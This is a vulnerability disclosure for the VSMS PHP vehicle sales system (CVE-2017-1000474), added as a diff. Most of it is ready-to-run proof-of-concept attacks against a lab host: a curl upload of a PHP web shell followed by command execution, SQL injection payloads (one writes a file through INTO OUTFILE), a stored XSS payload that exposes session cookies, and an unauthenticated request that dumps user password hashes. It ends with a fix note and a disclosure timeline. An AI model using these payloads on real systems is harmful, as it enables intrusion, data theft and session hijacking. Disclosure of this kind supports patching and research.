@@ -1,0 +1,83 @@
+# Exploit Title: VSMS Multiple Vulnerabilities
+# Google Dork: N/A
+# Date: 16-3-2018
+# Exploit Author: Sing
+# Vendor Homepage: https://sourceforge.net/projects/vsms-php/?source=typ_redirect
+# Software Link: https://sourceforge.net/projects/vsms-php/?source=typ_redirect
+# Version: 07/2017 (possible v1.2)
+# Tested on: CentOS 6.9
+# CVE : CVE-2017-1000474
+
+
+
+1 login/vehicles.php: Lack of file type filter enabling attacker to upload PHP scripts that can later be executed
+
+
+POC
+
+curl -i -b 'PHPSESSID=58csdp0as3lvqapqjesp67tr05' -F 'submit=submit' -F support_images[]=@./getShell.php http://10.0.0.14/soyket-vsms-php-63b563b/login/vehicles.php
+
+The malicious PHP file has been uploaded to /var/www/html/soyket-vsms-php-63b563b/login/uploads.  Now, browse to the location and note the file name.  In my vase it's 1510529218getShell.php.  To execute it do
+
+curl http://10.0.0.14/soyket-vsms-php-63b563b/login/uploads/1510529218getShell.php?cmd=id
+
+
+
+2 login/profile.php: Found SQLI in the Date of Birth text box.
+
+
+POC
+
+Paste the below POC into the birth date text box and update.  A mysql version will appear in the Position box
+
+2015-11-30',u_position=@@version,u_type='Employee' WHERE u_email='employee@employee.com';-- -
+
+
+
+3 login/Actions.php: Found Stored XSS in manufacturer_name
+
+
+POC
+
+curl http://10.0.0.14/soyket-vsms-php-63b563b/login/Actions.php?action=create -d 'manufacturer_name=<script>alert(document.cookie)</script>'
+
+Now when user's browse to login/model.php page, he/she will see an alert with the session cookie
+
+http://10.0.0.14/soyket-vsms-php-63b563b/login/model.php
+
+
+
+4 login/Actions.php (Multiple vulnerabilities)
+
+
+POC (SQLI)
+
+curl http://10.0.0.14/soyket-vsms-php-63b563b/login/Actions.php?action=checkuser -d "username=employee@employee.com' union select 'SQLIIII' into outfile'/tmp/stuff.txt"
+
+This SQLI will write SQLIIII to /tmp/stuff.txt.
+
+
+
+
+POC (Information Leak
+
+curl http://10.0.0.14/soyket-vsms-php-63b563b/login/Actions.php?action=listu
+
+This gives anonymous user full list of the users table with unsalted MD5 hash passwords.
+
+
+
+5. Solution:
+
+
+
+The author notified of a new version with fixes (possibly v1.3).  It can be found at vendor’s home page
+
+https://sourceforge.net/projects/vsms-php/?source=typ_redirect
+
+
+Time Line
+
+Author was notified of the vulnerabilities on 27-01-2018
+Author notified of the new updates on 14-03-2018
+Exploit released on 16-03-2018
